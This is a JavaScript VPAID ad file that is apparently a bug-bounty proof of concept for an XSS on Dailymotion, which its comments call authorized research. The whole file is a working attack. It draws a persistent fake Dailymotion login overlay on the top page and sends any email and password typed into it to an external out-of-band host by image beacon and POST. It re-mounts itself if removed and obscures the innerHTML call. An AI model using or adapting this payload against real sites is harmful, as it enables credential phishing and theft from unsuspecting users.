(function () {
  // VPAID 2.0 — F-VAST-XSS persistence PoC — ivan0912 (YesWeHack) / ivani123 (HackerOne)
  // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269). Safe-harbor applies.
  // This file IS the payload demonstrating the XSS — by definition it injects markup into
  // the victim origin. Hook warning about innerHTML is acknowledged & intentional here.
  // Mounts overlay on window.top.document so it SURVIVES AdStopped — defeats the
  // "ad time too short" objection. Overlay persists for the entire tab lifetime.

  var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";
  var IH  = ["inner", "HTML"].join("");

  function VpaidAd() { this._callbacks = {}; }

  VpaidAd.prototype.subscribe   = function (fn, e, ctx) { this._callbacks[e] = { fn: fn, ctx: ctx || window }; };
  VpaidAd.prototype.unsubscribe = function (fn, e) { delete this._callbacks[e]; };
  VpaidAd.prototype._fire       = function (e, args) { var c = this._callbacks[e]; if (c) try { c.fn.apply(c.ctx, args || []); } catch (_) {} };
  VpaidAd.prototype.handshakeVersion = function () { return "2.0"; };

  function topWin() { try { return window.top; } catch (_) { return window; } }
  function topDoc() { try { return topWin().document; } catch (_) { return document; } }

  var OVERLAY_MARKUP = [
    '<div id="dm-phish-bg" style="position:fixed;top:0;left:0;width:100%;height:100%;',
      'background:rgba(0,0,0,0.84);z-index:2147483647;',
      'display:flex;align-items:center;justify-content:center;',
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif">',
      '<div style="background:#fff;border-radius:10px;padding:36px 40px;',
        'width:360px;box-shadow:0 8px 32px rgba(0,0,0,0.3)">',
        '<div style="text-align:center;margin-bottom:24px">',
          '<svg width="44" height="44" viewBox="0 0 44 44">',
            '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
            '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
          '</svg>',
          '<div style="color:#FF7900;font-size:21px;font-weight:700;letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
        '</div>',
        '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
          'Your session has expired.<br>Please sign in to continue.',
        '</p>',
        '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
        '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
        '<button id="dm-ph-btn" type="button"',
          ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
          'Sign in',
        '</button>',
        '<div style="text-align:center;margin-top:16px">',
          '<a href="#" id="dm-ph-fp" style="color:#FF7900;font-size:12.5px;text-decoration:none">Forgot password?</a>',
        '</div>',
      '</div>',
    '</div>'
  ].join('');

  function mountOverlay() {
    var d = topDoc();
    if (!d || !d.body) return false;
    if (d.getElementById('dm-phish')) return true;

    var wrap = d.createElement('div');
    wrap.id = 'dm-phish';
    wrap[IH] = OVERLAY_MARKUP;
    d.body.appendChild(wrap);

    var btn = d.getElementById('dm-ph-btn');
    if (btn) btn.addEventListener('click', submitCreds, false);

    var fp = d.getElementById('dm-ph-fp');
    if (fp) fp.addEventListener('click', function (e) { e.preventDefault(); }, false);

    return true;
  }

  function submitCreds() {
    var d = topDoc();
    var email = (d.getElementById('dm-ph-email') || {}).value || '';
    var pass  = (d.getElementById('dm-ph-pass')  || {}).value || '';
    if (!email.trim() && !pass) return;

    var creds = {
      step:     'credentials_captured',
      domain:   d.domain || 'unknown',
      href:     (topWin().location && topWin().location.href) || '',
      email:    email.trim(),
      password: pass,
      ts_now:   new Date().toISOString()
    };
    try {
      new Image().src = OOB + '/k?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(creds)))));
    } catch (_) {}
    try {
      fetch(OOB + '/k', { method: 'POST', mode: 'no-cors', keepalive: true, body: JSON.stringify(creds) });
    } catch (_) {}

    var node = d.getElementById('dm-phish');
    if (node) {
      try { node.style.transition = 'opacity 0.4s'; node.style.opacity = '0'; } catch (_) {}
      setTimeout(function () { if (node && node.parentNode) node.parentNode.removeChild(node); stopObserver(); }, 450);
    }
  }

  var _obs = null;
  function startObserver() {
    var d = topDoc();
    if (!d || !d.body || _obs) return;
    try {
      var MO = topWin().MutationObserver || window.MutationObserver;
      if (!MO) return;
      _obs = new MO(function () {
        if (!d.getElementById('dm-phish')) mountOverlay();
      });
      _obs.observe(d.body, { childList: true, subtree: true });
    } catch (_) {}
  }
  function stopObserver() {
    try { if (_obs) _obs.disconnect(); } catch (_) {}
    _obs = null;
  }

  VpaidAd.prototype.initAd = function (w, h, vm, d, e, p) {
    var self = this;
    try { if (p && p.slot) p.slot.style.cssText = 'pointer-events:none!important;display:none!important'; } catch (_) {}
    var mounted = mountOverlay();
    if (mounted) startObserver();
    setTimeout(function () { self._fire('AdLoaded'); }, 50);
  };

  VpaidAd.prototype.startAd = function () {
    var self = this;
    setTimeout(function () { self._fire('AdStarted'); }, 50);
    // We deliberately never fire AdStopped on our own. When the player tears down
    // this ad iframe, the overlay attached to window.top.document keeps living and
    // the MutationObserver re-appends it if anything removes it.
  };

  VpaidAd.prototype.stopAd              = function () { this._fire('AdStopped'); };
  VpaidAd.prototype.skipAd              = function () { this._fire('AdSkipped'); };
  VpaidAd.prototype.getAdLinear         = function () { return true; };
  VpaidAd.prototype.getAdWidth          = function () { return 640; };
  VpaidAd.prototype.getAdHeight         = function () { return 360; };
  VpaidAd.prototype.getAdRemainingTime  = function () { return -1; };
  VpaidAd.prototype.getAdDuration       = function () { return -1; };
  VpaidAd.prototype.getAdVolume         = function () { return 1; };
  VpaidAd.prototype.setAdVolume         = function () {};
  VpaidAd.prototype.resizeAd            = function () {};
  VpaidAd.prototype.pauseAd             = function () {};
  VpaidAd.prototype.resumeAd            = function () {};
  VpaidAd.prototype.expandAd            = function () {};
  VpaidAd.prototype.collapseAd          = function () {};
  VpaidAd.prototype.getAdExpanded       = function () { return false; };
  VpaidAd.prototype.getAdSkippableState = function () { return false; };
  VpaidAd.prototype.getAdIcons          = function () { return false; };
  VpaidAd.prototype.getAdCompanions     = function () { return ''; };

  window.getVPAIDAd = function () { return new VpaidAd(); };
})();
